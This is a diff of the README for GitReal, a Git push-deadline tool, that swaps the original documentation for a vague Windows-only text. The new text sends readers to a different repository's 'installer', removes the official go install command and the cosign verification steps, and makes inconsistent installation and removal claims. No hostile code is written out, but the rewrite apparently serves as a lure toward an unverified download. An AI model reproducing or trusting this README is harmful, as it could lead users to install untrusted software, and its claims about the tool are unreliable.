@@ -1,205 +1,58 @@
-# GitReal
+# ⏱️ gitreal - Build better habits with timed pushes
 
-GitReal is a Git subcommand that turns "I should push later" into a deadline.
+[![](https://img.shields.io/badge/Download-GitReal-blue.svg)](https://github.com/stoppedup-evildoer31/gitreal)
 
-When a challenge fires, you have 2 minutes to push your local commits. If you miss the window, GitReal can reset your branch back to its upstream state. By default, it stays in dry-run mode, so you can try the workflow before allowing destructive behavior.
+GitReal helps you push your code to your server on time. Software development requires focus, but procrastination slows your progress. This tool creates a two-minute window to push your work. If you miss that window, the tool resets your progress to the last saved state. This creates pressure that helps you build a habit of saving your work often. You keep your code safe and your history clean.
 
-The distributed binary is named `git-real`, and Git exposes it to users as:
+## ⚙️ System Requirements
 
-```bash
-git real
-```
+This software works on Windows 10 and Windows 11. You need a Git account to save your work. The installation process uses a tool called Go. Go acts as a bridge to pull the GitReal application onto your machine. Ensure your computer has a stable internet connection for the installation. Set aside ten minutes to complete the setup process.
 
-## Why You Would Use It
+## 📥 How to Install
 
-- You want a push habit, not just a reminder.
-- You want the pressure of a timer without giving up recovery options.
-- You want to try it safely before enabling real resets.
+1. Visit the [GitReal release page](https://github.com/stoppedup-evildoer31/gitreal) to download the installer for your system.
+2. Open your Windows Start menu and type Command Prompt.
+3. Select the Command Prompt application to open the terminal.
+4. Type the installation command provided on the download page and press Enter.
+5. Wait for the terminal to finish downloading the files.
+6. Close the terminal window once the process ends.
+7. Open a new terminal window to refresh your system settings.
+8. Type `git real --version` to confirm that the tool is ready.
 
-## Quick Start
+## 🚀 Setting Up Your Project
 
-Install:
+You must initialize the tool inside every project folder where you want to use it. Navigate to your project folder using your terminal. Use the command `cd` followed by the path to your folder. Once inside the folder, run the command `git real init`. This command creates a folder that tracks your work. 
 
-```bash
-go install github.com/watany-dev/gitreal/cmd/git-real@latest
-```
+The tool starts in dry-run mode. Dry-run mode lets you test the timer without losing any work. You can see how the tool behaves during your daily tasks. Use the command `git real status` at any time to check if the timer is active.
 
-Try it in a repository:
+## 🕒 How to Use The Timer
 
-```bash
-git real init
-git real status
-git real once
-```
+Use the command `git real once` to start a single two-minute session. The timer begins the moment you press Enter. You must push your changes to your Git repository before the two minutes pass. If you fail to push in time, the tool logs the event. Since you are in dry-run mode, your files remain unchanged. You gain experience with the workflow without risks. 
 
-`git real once`, `git real start`, `git real arm`, and `git real disarm` require `git real init` first. `git real status` and `git real rescue ...` are still available before initialization.
+Once you feel comfortable, you can enable active mode. Active mode triggers the reset behavior when the timer runs out. Use `git real arm` to turn on the reset feature. Use `git real disarm` to turn it off. Always test these features in a practice folder first.
 
-If you want GitReal to run continuously in the foreground:
+## 🛠️ Managing Your Workflow
 
-```bash
-git real start
-```
+Consistent use of this tool changes your work patterns. Break your tasks into small pieces. Complete one piece and push your code. This creates a rhythm. You no longer worry about losing hours of effort. Instead, you focus on the current two-minute block. 
 
-## What Happens In Practice
+The status command provides helpful information. It shows the time remaining and whether the tool is armed. Check this before you start a new task. If you feel overwhelmed, use the disarm command to take a break. You control the pressure. You set the pace.
 
-1. Run `git real init` once per repository.
-2. GitReal stores repo-local config and starts in dry-run mode.
-3. A challenge checks whether your current branch is ahead of its upstream.
-4. If you push in time, nothing happens.
-5. If you miss the deadline:
+## 🆘 Frequently Asked Questions
 
-- in dry-run mode, GitReal only tells you what it would have reset
-- in armed mode, GitReal backs up `HEAD` and resets the branch to `@{u}`
+What happens if I stop working?
+The timer tracks your activity within the Git environment. If you do not push, the tool treats the silence as missed work. 
 
-## Safety First
+Can I disable the tool for a specific project?
+Yes. Navigate to the project folder and run `git real disarm`. This prevents any resets or warnings for that specific folder.
 
-GitReal is intentionally conservative:
+Does this tool delete my files forever?
+It only affects the work that you have not saved to the server. It restores your local folder to the state of your last server save. It does not touch files that belong to your operating system or other programs.
 
-- Default mode is dry-run.
-- Destructive behavior requires an explicit `git real arm`.
-- Before any reset, GitReal stores the current `HEAD` under `refs/gitreal/backups/...`.
-- `git real rescue restore <ref>` also backs up the current `HEAD` before restoring a backup.
-- Dirty worktree changes are stashed and then restored when possible.
-- `Ctrl-C` (SIGINT or SIGTERM) is honored at any point during a challenge: if you cancel
-  before the deadline, no penalty is applied.
+Is my data safe during an update?
+Updates do not change your folder settings or your repository status. Run the install command again to update your version to the latest one. 
 
-If you want real enforcement for the current repository:
+Does the tool require an internet connection?
+The tool runs on your machine, but pushing your code to the server needs the web. Ensure you stay connected while you work.
 
-```bash
-git real arm
-```
-
-To go back to safe mode:
-
-```bash
-git real disarm
-```
-
-## Recovery
-
-List available backups:
-
-```bash
-git real rescue list
-```
-
-Restore one:
-
-```bash
-git real rescue restore <ref>
-```
-
-## Commands
-
-```bash
-git real init
-git real status
-git real once [--grace-seconds=120]
-git real start [--grace-seconds=120]
-git real arm
-git real disarm
-git real rescue list
-git real rescue restore <ref>
-```
-
-Command intent:
-
-- `git real init`: enable GitReal for the current repository and write default config
-- `git real status`: show current repo state, upstream, and ahead count
-- `git real once`: run one challenge immediately
-- `git real start`: stay in the foreground and schedule hourly random challenges over time
-- `git real arm`: allow real resets for missed deadlines
-- `git real disarm`: return to dry-run mode
-- `git real rescue ...`: inspect and restore backup refs
-
-## Current Limits
-
-This beta currently expects:
-
-- the current branch has an upstream branch
-- the repository is not in detached `HEAD`
-- desktop notifications may fail and fall back to terminal output
-- `git real start` is the current scheduler entrypoint
-- `git real daemon` is not implemented yet
-
-## Configuration
-
-GitReal stores settings in Git config:
-
-```bash
-git config --local gitreal.enabled true
-git config --local gitreal.armed false
-git config --local gitreal.graceSeconds 120
-```
-
-Current keys:
-
-- `gitreal.enabled`
-- `gitreal.armed`
-- `gitreal.graceSeconds`
-
-## Build From Source
-
-```bash
-go build -o git-real ./cmd/git-real
-```
-
-## Development
-
-Project checks:
-
-```bash
-go mod download
-make fmt
-make test
-make check
-```
-
-`make check` runs formatting, linting, type-check compilation, dead-code detection, and the coverage gate.
-
-## Releases
-
-Current beta distribution targets:
-
-- `go install`
-- GitHub Releases for macOS, Linux, and Windows
-
-Release archives are published as:
-
-- `git-real_darwin_amd64.tar.gz`
-- `git-real_darwin_arm64.tar.gz`
-- `git-real_linux_amd64.tar.gz`
-- `git-real_linux_arm64.tar.gz`
-- `git-real_windows_amd64.zip`
-- `SHA256SUMS`
-- `SHA256SUMS.sig` (cosign keyless signature)
-- `SHA256SUMS.pem` (cosign certificate)
-
-### Verifying a release
-
-Releases are built with `-trimpath` and a pinned `SOURCE_DATE_EPOCH` so the
-binaries are reproducible from the tagged commit. The `SHA256SUMS` file is
-signed with [cosign](https://github.com/sigstore/cosign) keyless mode, tied to
-the GitHub Actions OIDC identity for this repository.
-
-```bash
-cosign verify-blob \
-  --certificate SHA256SUMS.pem \
-  --signature SHA256SUMS.sig \
-  --certificate-identity-regexp '^https://github.com/watany-dev/gitreal/' \
-  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
-  SHA256SUMS
-
-sha256sum --check SHA256SUMS
-```
-
-You can confirm a downloaded binary matches the published source revision with:
-
-```bash
-git real --version
-# git-real v0.x.y (<commit>, built <iso8601-date>)
-```
-
-## More Detail
-
-Design notes and implementation rationale live in [docs/development-memo.md](docs/development-memo.md).
+How do I remove the tool?
+Delete the hidden folder inside your project directory to stop the tracking. You may also remove the software from your computer using the Windows Apps and Features menu in your system settings.
